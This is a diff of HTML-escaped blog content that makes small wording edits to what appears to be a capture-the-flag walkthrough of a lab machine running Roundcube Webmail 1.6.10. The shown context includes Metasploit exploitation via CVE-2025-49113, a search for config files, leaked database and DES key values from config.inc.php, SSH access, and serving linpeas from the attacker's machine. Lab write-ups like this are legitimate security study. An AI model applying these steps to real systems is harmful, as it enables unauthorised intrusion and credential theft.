@@ -66,7 +66,7 @@
 &lt;p&gt;We&amp;rsquo;re dealing with &lt;strong&gt;Roundcube Webmail 1.6.10&lt;/strong&gt;. Before diving down a Google rabbit hole for exploits, my first move is always to fire up &lt;code&gt;metasploit&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfconsole
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search roundcube
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And what do you know, we hit the jackpot! An exploit for a version less than 1.6.1 is available, which is close enough to investigate. The exact CVE is &lt;code&gt;CVE‑2025‑49113&lt;/code&gt;.&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is &lt;code&gt;CVE‑2025‑49113&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;metasploit_exp.png&#34; alt=&#34;Metasploit Modules&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Time to exploit (rubs hands).
 Used the following steps to run the exploit:&lt;/p&gt;
@@ -81,7 +81,7 @@ Used the following steps to run the exploit:&lt;/p&gt;
 &lt;p&gt;My first order of business on a new machine is always to hunt for passwords and config files.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find /var -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;config&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This led me to &lt;code&gt;/var/www/html/roundcube/config&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Peeking into this folder gave away the file &lt;code&gt;config.inc.php&lt;/code&gt; and it contained some spicy details
+&lt;p&gt;Peeking into this folder gave away the file &lt;code&gt;config.inc.php&lt;/code&gt; and it contained some spicy details.
 Here is a sneak peak:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db_dsnw&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&amp;#39;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;des_key&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rcmail-!24ByteDESkey*Str&amp;#39;&lt;/span&gt;;
@@ -126,7 +126,7 @@ For now we have enabled resource monitoring with Below and have granted you priv
 Please inform us immediately if you notice any irregularities.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh jacob@10.10.11.77
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have user.txt and a massive clue from that mail lets check how we can escalate
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have user.txt and a massive clue from that mail lets check how we can escalate.
 Lets use &lt;code&gt;LinPeas&lt;/code&gt; to find something (&lt;code&gt;sudo -l&lt;/code&gt; could also reveal information but linpeas might give additional details)&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On your machine - where linpeas.sh resides&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
